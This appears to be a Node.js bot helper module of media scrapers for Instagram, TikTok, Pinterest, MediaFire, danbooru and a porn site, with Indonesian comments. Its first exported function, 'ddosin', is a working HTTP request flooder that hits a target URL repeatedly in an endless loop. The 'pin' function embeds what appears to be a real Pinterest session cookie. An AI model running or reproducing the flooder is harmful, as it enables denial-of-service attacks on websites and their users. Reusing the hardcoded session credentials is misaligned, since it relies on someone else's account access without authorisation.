
/*Thanks pembuat scraper
-fumi
-kaze

*/

const axios = require("axios");
const cheerio = require("cheerio");
const qs = require("qs");
const fetch = require("node-fetch");
const fs = require('fs');
const SocksProxyAgent = require('socks-proxy-agent');
const HttpsProxyAgent = require('https-proxy-agent');
const randomUseragent = require('random-useragent');

const req = require('request')

const ddosin = (url, qty, ms) => {
    let err = ok = 0
    setInterval(_ => {
        for (let i = qty; i--;)
            req(url, error => !error ? ok++ : err++)
        console.log(`result:' ${ ok } ${ err }`)
        err = ok = 0
    }, ms)
}
async function aiLogic(content, prompt) {
    try {
        const response = await axios.post('https://luminai.my.id/', { content, prompt });
        console.log(response.data);
        return response.data;
    } catch (error) {
        console.error(error);
        throw error;
    }
}

async function instagram(url) {
    const requestData = 'recaptchaToken=&q=' + url + '=media&lang=en';

    try {
        const { data } = await axios.post('https://v3.igdownloader.app/api/ajaxSearch', requestData, {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept': '*/*'
            }
        });

        const $ = cheerio.load(data.data);

        const thumb = $('.download-items__thumb img').attr('src');
        const link = $('.download-items__btn a').attr('href');

        const result = {
            status: true, 
            creator: 'fumi', 
            thumb: thumb,
            link: link
        };

        return result;
    } catch (error) {
        console.error("Error:", error);
        return null;
    }
}

async function videyCo(link) {
 const url = link;

 try {
 const response = await axios.get(url);
 const html = response.data;
 const $ = cheerio.load(html);

 const videoUrl = $('source').attr('src');

 return { 
status: true, 
creator: 'deffri', 
data: videoUrl 
};
 } catch (error) {
 console.error('Error:', error);
 return [];
 }
}

async function tiktokStalk(user) {
  try {
    const url = await fetch(`https://tiktok.com/@${user}`, {
      headers: {
        'User-Agent': 'PostmanRuntime/7.32.2'
      }
    });
    const html = await url.text();
    const $ = cheerio.load(html);
    const data = $('#__UNIVERSAL_DATA_FOR_REHYDRATION__').text();
    const result = JSON.parse(data);
    if (result['__DEFAULT_SCOPE__']['webapp.user-detail'].statusCode !== 0) {
      const ress = {
        status: 'error',
        message: 'User not found!',
      };
      console.log(ress);
      return ress;
    }
    const res = result['__DEFAULT_SCOPE__']['webapp.user-detail']['userInfo'];
    return res;
  } catch (err) {
    console.log(err);
    return String(err);
  }
};

async function alldl(url){
const req = {
    url: url
}
const header = {
    'Accept': 'application/json',
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    'Referer': 'https://cobalt.tools/'
};
try {
const resp = await fetch('https://api.cobalt.tools/api/json', {
method: 'POST',
headers: header,
body: JSON.stringify(req)
});

if (resp.ok) {
const data = await resp.json();
return data
} else {
return {
status: false,
message: 'permintaan tidak dapat diproses'
}
}
} catch (error) {
return {
status: false,
message: error
}
}
}

function mediafiredl(url) {
    return new Promise(async(resolve, reject) => {
		var a, b;
		if (!/https?:\/\/(www\.)?mediafire\.com/.test(url)) return resolve()
	   const data = await axios.get(url).catch(function (error) {})
	   if (!data) {
		resolve()
	   } else {
		const $ = cheerio.load(data.data);
		const Url = ($('#downloadButton').attr('href') || '').trim();
		const url2 = ($('#download_link > a.retry').attr('href') || '').trim();
		const $intro = $('div.dl-info > div.intro');
		const filename = $intro.find('div.filename').text().trim();
		const filetype = $intro.find('div.filetype > span').eq(0).text().trim();
		const ext = ((b = (a = /\(\.(.*?)\)/.exec($intro.find('div.filetype > span').eq(1).text())) === null || a === void 0 ? void 0 : a[1]) === null || b === void 0 ? void 0 : b.trim()) || 'bin';
		const $li = $('div.dl-info > ul.details > li');
		const aploud = $li.eq(1).find('span').text().trim();
		const filesizeH = $li.eq(0).find('span').text().trim();
		const filesize = (0, parseFileSize)(filesizeH);
		const result = {
		    status: true, 
            creator: 'deffri',
			url: Url || url2,
			url2,
			filename,
			filetype,
			ext,
			upload_date: aploud,
			filesizeH,
			filesize
		};
		resolve(result)
	   }
	 
		})
}

async function pinterest(query) {
  const baseUrl = 'https://www.pinterest.com/resource/BaseSearchResource/get/';
  const queryParams = {
    source_url: '/search/pins/?q=' + encodeURIComponent(query),
    data: JSON.stringify({
      options: {
        isPrefetch: false,
        query,
        scope: 'pins',
        no_fetch_context_on_resource: false
      },
      context: {}
    }),
    _: Date.now()
  };
  const url = new URL(baseUrl);
  Object.entries(queryParams).forEach(entry => url.searchParams.set(entry[0], entry[1]));

  try {
    const json = await (await fetch(url.toString())).json();
    const results = json.resource_response?.data?.results?? [];
    return results.map(item => ({
      pin: 'https://www.pinterest.com/pin/' + item.id?? '',
      link: item.link?? '',
      created_at: (new Date(item.created_at)).toLocaleDateString('id-ID', {
        day: 'numeric',
        month: 'long',
        year: 'numeric'
      })?? '',
      id: item.id?? '',
      images_url: item.images?.['736x']?.url?? '',
      grid_title: item.grid_title?? ''
    }));
  } catch (error) {
    console.error('Error mengambil data:', error);
    return [];
  }
}
async function pin(query) {
return new Promise(async (resolve, reject) => {
axios.get('https://id.pinterest.com/search/pins/?autologin=true&q=' + query, {
headers: {
"cookie": "_auth=1; _b=\"AVna7S1p7l1C5I9u0+nR3YzijpvXOPc6d09SyCzO+DcwpersQH36SmGiYfymBKhZcGg=\"; _pinterest_sess=TWc9PSZHamJOZ0JobUFiSEpSN3Z4a2NsMk9wZ3gxL1NSc2k2NkFLaUw5bVY5cXR5alZHR0gxY2h2MVZDZlNQalNpUUJFRVR5L3NlYy9JZkthekp3bHo5bXFuaFZzVHJFMnkrR3lTbm56U3YvQXBBTW96VUgzVUhuK1Z4VURGKzczUi9hNHdDeTJ5Y2pBTmxhc2owZ2hkSGlDemtUSnYvVXh5dDNkaDN3TjZCTk8ycTdHRHVsOFg2b2NQWCtpOWxqeDNjNkk3cS85MkhhSklSb0hwTnZvZVFyZmJEUllwbG9UVnpCYVNTRzZxOXNJcmduOVc4aURtM3NtRFo3STlmWjJvSjlWTU5ITzg0VUg1NGhOTEZzME9SNFNhVWJRWjRJK3pGMFA4Q3UvcHBnWHdaYXZpa2FUNkx6Z3RNQjEzTFJEOHZoaHRvazc1c1UrYlRuUmdKcDg3ZEY4cjNtZlBLRTRBZjNYK0lPTXZJTzQ5dU8ybDdVS015bWJKT0tjTWYyRlBzclpiamdsNmtpeUZnRjlwVGJXUmdOMXdTUkFHRWloVjBMR0JlTE5YcmhxVHdoNzFHbDZ0YmFHZ1VLQXU1QnpkM1FqUTNMTnhYb3VKeDVGbnhNSkdkNXFSMXQybjRGL3pyZXRLR0ZTc0xHZ0JvbTJCNnAzQzE0cW1WTndIK0trY05HV1gxS09NRktadnFCSDR2YzBoWmRiUGZiWXFQNjcwWmZhaDZQRm1UbzNxc21pV1p5WDlabm1UWGQzanc1SGlrZXB1bDVDWXQvUis3elN2SVFDbm1DSVE5Z0d4YW1sa2hsSkZJb1h0MTFpck5BdDR0d0lZOW1Pa2RDVzNySWpXWmUwOUFhQmFSVUpaOFQ3WlhOQldNMkExeDIvMjZHeXdnNjdMYWdiQUhUSEFBUlhUVTdBMThRRmh1ekJMYWZ2YTJkNlg0cmFCdnU2WEpwcXlPOVZYcGNhNkZDd051S3lGZmo0eHV0ZE42NW8xRm5aRWpoQnNKNnNlSGFad1MzOHNkdWtER0xQTFN5Z3lmRERsZnZWWE5CZEJneVRlMDd2VmNPMjloK0g5eCswZUVJTS9CRkFweHc5RUh6K1JocGN6clc1JmZtL3JhRE1sc0NMTFlpMVErRGtPcllvTGdldz0=; _ir=0"
}
}).then(({
data
}) => {
const $ = cheerio.load(data)
const result = [];
const hasil = [];
$('div > a').get().map(b => {
const link = $(b).find('img').attr('src')
result.push(link)
});
result.forEach(v => {
if (v == undefined) return
hasil.push(v.replace(/236/g, '736'))
})
hasil.shift();
resolve(hasil)
})
})
}

function pornogratis(nomor) {
return new Promise((resolve, reject) => {
  axios.get(`https://pornogratis.vlog.br/?s=${nomor}`).then( tod => {
  const $ = cheerio.load(tod.data)  
  var a = [];
$("div.videos-row").each((_, say) => {
    var title = $(say).find("a").attr('title');
    var img = $(say).find("img").attr('src');
    var link = $(say).find("a").attr('href');
    var hasil = {
      title: title,
      img: img,
      link: link
    }
    a.push(hasil)
  })
  resolve(a)
  }).catch(reject)
  });
}

async function dbr(q) {
    const url = `https://danbooru.donmai.us/posts?tags=${encodeURIComponent(q)}`;
    const response = await axios.get(url);
    const html = response.data;
    const $ = cheerio.load(html);

    const results = [];

    $('article.post-preview').each((index, element) => {
        const title = $(element).attr('data-id');
        const imgSrc = $(element).find('img').attr('src');
        const tags = $(element).attr('data-tags').split(' ');

        results.push({ title, imgSrc, tags });
    });

    return results 
}

module.exports.ddosin = ddosin
module.exports.aiLogic = aiLogic
module.exports.instagram = instagram
module.exports.videyCo = videyCo
module.exports.tiktokStalk = tiktokStalk
module.exports.mediafiredl = mediafiredl
module.exports.alldl = alldl
module.exports.pinterest = pinterest
module.exports.pinterest = pin
module.exports.pornogratis = pornogratis
module.exports.dbr = dbr